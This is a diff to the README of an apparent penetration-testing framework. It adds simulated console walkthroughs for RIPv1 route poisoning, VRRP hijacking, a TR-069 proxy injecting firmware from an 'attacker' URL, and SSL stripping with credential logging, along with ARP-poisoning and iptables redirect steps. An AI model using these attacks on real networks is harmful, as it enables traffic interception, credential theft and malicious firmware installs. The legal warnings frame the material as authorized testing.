@@ -237,25 +237,109 @@ See [docs/wiki/en-US/12-nse-scripts.md](docs/wiki/en-US/12-nse-scripts.md) for t
 
 ---
 
-## Security Modules (BLOCO J)
+## BLOCO J - Attack Categories (v2.0.0)
 
-New attack category modules added in BLOCO J expansion:
+> **LEGAL WARNING:** All modules in this section are for **authorized security testing, research, and educational use only**. Execution against production firewalls or routers without explicit written authorization is a federal crime. The authors and Uniao Geek assume no liability for misuse.
 
 ### Routing Attacks
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `rip_v1_poison` | `exploits/routing/` | HIGH | RIPv1 routing table poison (CVE-1999-0111). Sends spoofed RIPv1 Response claiming default route via attacker. No authentication in RIPv1. |
-| `vrrp_hijack` | `exploits/routing/` | HIGH | VRRP active router takeover via priority 255 Advertisement. Target master yields; attacker becomes active router for the virtual IP. Requires Scapy. |
+> **WARNING:** Routing injection attacks redirect network traffic, may disrupt perimeter security and production services. Authorized lab use only.
+
+```bash
+fxf > use exploits/routing/rip_v1_poison
+fxf (RIPv1Poison) > set src_ip 192.168.1.100
+fxf (RIPv1Poison) > set poison_network 0.0.0.0
+fxf (RIPv1Poison) > set metric 1
+fxf (RIPv1Poison) > set destination 255.255.255.255
+fxf (RIPv1Poison) > set simulate true
+fxf (RIPv1Poison) > run
+
+[SIMULATE] Would send RIPv1 Response to 255.255.255.255:520
+[SIMULATE] Network: 0.0.0.0 (default route) metric=1 next-hop=192.168.1.100
+[SIMULATE] Payload (24 bytes): 0201000000020000...
+[SIMULATE] Exploits CVE-1999-0111: RIPv1 has no authentication
+[SIMULATE] Effect: routers accepting unauthenticated RIPv1 install default route via attacker
+[!] Set simulate false + destructive true to execute
+```
+
+```bash
+fxf > use exploits/routing/vrrp_hijack
+fxf (VRRPHijack) > set src_ip 192.168.1.100
+fxf (VRRPHijack) > set vrid 1
+fxf (VRRPHijack) > set virtual_ip 192.168.1.1
+fxf (VRRPHijack) > set priority 255
+fxf (VRRPHijack) > set simulate true
+fxf (VRRPHijack) > run
+
+[SIMULATE] Would send 5 VRRP Advertisement(s)
+[SIMULATE]   VRID=1 priority=255 virtual_ip=192.168.1.1 advert_int=1s
+[SIMULATE]   src=192.168.1.100 -> dst=224.0.0.18 (IP proto 112)
+[SIMULATE]   VRRP payload (16 bytes): 21012001...
+[SIMULATE] Effect: current VRRP master yields; attacker becomes active router for 192.168.1.1
+[!] PREREQ: Scapy + raw socket privileges (Linux root) or Windows admin
+```
+
+| Module | Path | Impact | Reference |
+|--------|------|--------|-----------|
+| `rip_v1_poison` | `exploits/routing/` | HIGH | CVE-1999-0111, RFC 1058 |
+| `vrrp_hijack` | `exploits/routing/` | HIGH | RFC 3768, MITRE T1557 |
 
 ### MiTM Proxies
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `ssl_strip_embedded` | `exploits/mitm/` | HIGH | SSL strip MiTM proxy for embedded device admin panels. Strips HTTPS redirects, removes HSTS headers, logs credentials in plaintext. Requires ARP poisoning and iptables redirect. |
-| `tr069_mitm_proxy` | `exploits/mitm/` | CRITICAL | TR-069 CWMP session interception proxy. Intercepts CPE-ACS traffic and injects firmware Download RPC or SetParameterValues commands. Requires ARP poisoning. |
+> **WARNING:** MiTM proxy modules intercept and potentially modify management traffic to network devices. May expose credentials and enable unauthorized configuration changes. Requires ARP poisoning as prerequisite.
 
-All modules default to `simulate=True`. Live execution requires `destructive=True` set explicitly.
+```bash
+fxf > use exploits/mitm/tr069_mitm_proxy
+fxf (TR069MiTM) > set acs_host 10.0.0.1
+fxf (TR069MiTM) > set acs_port 7547
+fxf (TR069MiTM) > set listen_port 7547
+fxf (TR069MiTM) > set inject_mode firmware
+fxf (TR069MiTM) > set firmware_url http://attacker/malicious.bin
+fxf (TR069MiTM) > set simulate true
+fxf (TR069MiTM) > run
+
+[SIMULATE] Would bind CWMP proxy on 0.0.0.0:7547
+[SIMULATE]   Upstream ACS: 10.0.0.1:7547 (ssl=False)
+[SIMULATE]   Injection mode: inject Download RPC pointing to http://attacker/malicious.bin
+[SIMULATE] Setup required:
+[SIMULATE]   1. ARP poison CPE to redirect port 7547 to attacker
+[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 7547 -j REDIRECT --to-port 7547
+[!] Set simulate false + destructive true to start proxy
+```
+
+```bash
+fxf > use exploits/mitm/ssl_strip_embedded
+fxf (SSLStrip) > set target 192.168.1.1
+fxf (SSLStrip) > set target_port 443
+fxf (SSLStrip) > set listen_port 10080
+fxf (SSLStrip) > set simulate true
+fxf (SSLStrip) > run
+
+[SIMULATE] Would bind SSL strip proxy on 0.0.0.0:10080
+[SIMULATE]   Upstream target: 192.168.1.1:443 (use_ssl_upstream=True)
+[SIMULATE]   All HTTPS references stripped to HTTP in responses
+[SIMULATE]   Credentials, cookies, and auth headers logged in plaintext
+[SIMULATE] Setup required:
+[SIMULATE]   1. ARP poison target: arp -s <target_ip> <attacker_mac>
+[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10080
+[!] Set simulate false + destructive true to start proxy
+```
+
+| Module | Path | Impact | Reference |
+|--------|------|--------|-----------|
+| `tr069_mitm_proxy` | `exploits/mitm/` | CRITICAL | TR-069 Amendment 6, CVE-2014-9222 |
+| `ssl_strip_embedded` | `exploits/mitm/` | HIGH | BlackHat DC 2009 (Marlinspike), MITRE T1557.002 |
+
+### Coverage Summary
+
+| Category | Modules | Default Mode |
+|----------|---------|-------------|
+| Routing Attacks | `rip_v1_poison`, `vrrp_hijack` | simulate=True |
+| MiTM Proxies | `tr069_mitm_proxy`, `ssl_strip_embedded` | simulate=True |
+| Perimeter Exploits | `fortios_sslvpn_session_reuse`, `cisco_asa_ftd_firestarter_chain`, + 10+ | simulate=True |
+| Credentials | `perimeter_auth_bruteforce` | simulate=True |
+
+All modules default to `simulate=True`. Live execution requires `destructive=True` set explicitly after reviewing the simulated output.
 
 ---
 
